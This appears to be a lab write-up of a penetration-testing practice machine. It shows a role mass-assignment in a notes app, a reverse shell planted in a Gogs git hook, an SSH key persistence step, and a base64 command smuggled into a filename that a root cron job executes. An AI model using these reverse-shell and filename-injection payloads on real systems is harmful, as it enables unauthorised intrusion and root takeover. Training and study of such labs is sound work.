- All: #notes-pg #gogs #api #git-hook #reverse-shell #netcat-busybox #pspy #cron #find #exec #bash-p #base64
- Foothold: #notes-pg #api
- Access: #gogs #git-hook #reverse-shell #netcat-busybox
- Priv Esc: #pspy #cron #find #exec #bash-p #base64
#### Enumeration

>[!code] Enumerate the ports
>- rustscan -a $ip
>
>![Pasted image 20240609145513](/Images/Pasted%20image%2020240609145513.png)

>[!code]- Note the web server at port 8000 (a Gogs service)
>- A Gogs service:
>
>![Pasted image 20240610045354](/Images/Pasted%20image%2020240610045354.png)
#### Local.txt
##### Find login credentials for the Gogs service

>[!code]- Navigate to the web server on port 80 (a notes.pg service)
>We're met with a login page:
>>[!code]- Screenshot of the login page
>>![Pasted image 20240610043302](/Images/Pasted%20image%2020240610043302.png)

>[!code]- Create an account and note the POST payload
Note the POST data used when creating an account:
>```powershell
>authenticity_token=pR8JHMdHN-duxwY2UT7Kd5JPwOz61k5fcjR79C-tPYT87LDqLvI3VgylAkUhINhKxz9W9nZYUMhAcBXyFVNL4g&user%5Busername%5D=new_user&user%5Bpassword%5D=new_password&user%5Bpassword_confirmation%5D=new_password&button=
>```

>[!code]- Discover that we don't have access to all the posted notes on the website
>- After creating a note we see we can access it at http://assignment.pg/notes/6
>- So there must be another 5 notes
>- We are told we have _Insufficient rights!_ to access ../notes/1
>
>>[!code]- Create a new note
>>![Pasted image 20240610044141](/Images/Pasted%20image%2020240610044141.png)
>
>>[!code]- Note the URL of the created note (.../notes/6)
>>![Pasted image 20240610044202](/Images/Pasted%20image%2020240610044202.png)
>
>>[!code]- Cannot access .../notes/1
>>![Pasted image 20240610044356](/Images/Pasted%20image%2020240610044356.png)

>[!Exploit]- Priv Esc 1. Find leaked credentials for another account
>- The _members_ page includes the POST payload of a created account.
>- It suggests an account has the username _forged_owner_:_forged_owner_
>
>>[!code]- The members page
>>![Pasted image 20240610043459](/Images/Pasted%20image%2020240610043459.png)

>[!exploit]- Priv Esc 2. Abuse the _role_ attribute when creating a new account
>- When browsing our profile information, we see there is a _role_ attribute which equals _member_.
>- In contrast, the _role_ attribute for the _jane_ account is _owner_.
>- This suggests when creating a new account we can set this role attribute to owner.
>
>>[!code]- Profile of our account
>>![Pasted image 20240611045102](/Images/Pasted%20image%2020240611045102.png)
>
>>[!code]- Profile of the _jane_ account
>>![Pasted image 20240611045138](/Images/Pasted%20image%2020240611045138.png)
>
>So, when creating a new account (_forged_owner_), we can edit the payload to make our role be an _owner_:
>```powershell
>authenticity_token=oPR93X4UzlLdlPeg_Aek9v3XDDJLLoL3hXS8pHLwzOPz8ER61j8nzjESjr4Tsq-_VGRhZBVCZ9TSr9VZqIe5YQ&user[username]=forged_owner&user[role]=owner&user[password]=forged_owner&user[password_confirmation]=forged_owner&button=
>```

>[!code]- Login as _forged_user_ and get access to note 1
>- It appears to contain credentials for the Gogs service (running at port 8000):
>
>>[!code]- Note 1
>>![Pasted image 20240610044811](/Images/Pasted%20image%2020240610044811.png)

>[!success]- Obtain credentials `jane`:`svc-dev2022@@@!;P;4SSw0Rd`
##### Obtain a reverse shell via the Gogs service

>[!code]- Login to Gogs and create a new repository
>Create a new repository
>>[!code]- Create a new repository
>>![Pasted image 20240610045601](/Images/Pasted%20image%2020240610045601.png)

>[!exploit]- Exploit - We can edit the _update_ Git Hook to execute a reverse shell
>Update the 'update' Git Hook so that it executes a reverse shell.
>- The code within the update Git Hook will execute when the repository is updated, eg when something it committed to it.
>- The chosen reverse shell is [Netcat Busybox](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#netcat-busybox)
>
>>[!code]- Adding a reverse shell into the update Git Hook
>>![Pasted image 20240610045801](/Images/Pasted%20image%2020240610045801.png)
>
>>[!code]- Netcat Busybox reverse shell
>>```bash
>>rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
>>```

>[!code]- Clone the repository to execute the Git Hook
>To update the repository we can add a file to the repository:
>```bash
>$ git clone http://assignment.pg:8000/jane/test.git
>$ cd test
>$ touch README.md
>$ git init
>$ git add README.md
>$ git commit -m "first commit"
>```
>___
>
>Setup a listener on Kali:
>```bash
>$ nc -lvnp 1234
>```
>___
>
>Push the changes to the repository and catch the reverse shell with the listener:
>```bash
> git push origin master
>```

>[!success]- Obtain local.txt
>After receiving our reverse shell, we can find local.txt:
>![Pasted image 20240610053205](/Images/Pasted%20image%2020240610053205.png)

>[!code]- Get SSH access as Jane
>Create the authorized_keys folder on victim:
>```bash
>$ cd /home/jane/.ssh/
>$ touch authorized_keys
>```
>Copy my public key on Kali into the authorized_keys files on victim:
>```bash
>bubbleman@kali>$ cat id_ed25519.pub
>$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICht3Ccu4rTtNKLaGqJzTTqFu7MwpBQuPpftcfBYADxn bubbleman@kali' > authorized_keys
>```
>SSH into victim as jane:
>```bash
>bubbleman@kali>$ ssh jane@192.168.235.224 -i ~/.ssh/id_ed25519
>```
#### Proof.txt

>[!code]- Run pspy and find a cron job running a vulnerable find command
>- A script is executing a vulnerable command as root
>
>>[!code]- Cron job
>>![Pasted image 20240612044104](/Images/Pasted%20image%2020240612044104.png)
>
>We have write permissions on the /dev/shm/ folder:
>>[!code]- /dev/shm/ permissions
>>![Pasted image 20240612044327](/Images/Pasted%20image%2020240612044327.png)

>[!exploit]- Exploit - Create a malicious file for the find command
>- The cron job finds all files within the _/dev/shm/_ directory and passes them to the _rm_ command which executes them
>- We can create a new file which adds SUID permissions to the _/bin/bash_ file (ignore the backslash before the double equals sign)
>
>```bash
>jane@assignment:/tmp$ touch /dev/shm/'$(echo -n Y2htb2QgdStzIC9iaW4vYmFzaA\==|base64 -d|bash)'
>```
>
>>[!code]- The decoded base64 string
>>![Pasted image 20240611052054](/Images/Pasted%20image%2020240611052054.png)
>
>This would cause the cron script to execute:
>```bash
>sh -c 'rm $(echo -n Y2htb2QgdStzIC9iaW4vYmFzaA\==|base64 -d|bash)'
>```
>After creating the file, /dev/shm/ contains:
>>[!code]- /dev/shm with the malicious file
>>![Pasted image 20240612045538](/Images/Pasted%20image%2020240612045538.png)
>
>The permissions of the /bin/bash change after executing:
>>[!code]- /bin/bash permission change
>>Before:
>>![Pasted image 20240612045037](/Images/Pasted%20image%2020240612045037.png)
>>After:
>>![Pasted image 20240612045606](/Images/Pasted%20image%2020240612045606.png)
>
>Now we can execute bash with the permissions of the owner (**-p**):
>
>![Pasted image 20240612045719](/Images/Pasted%20image%2020240612045719.png)

>[!success]- Obtain proof.txt
>
>![Pasted image 20240612045907](/Images/Pasted%20image%2020240612045907.png)




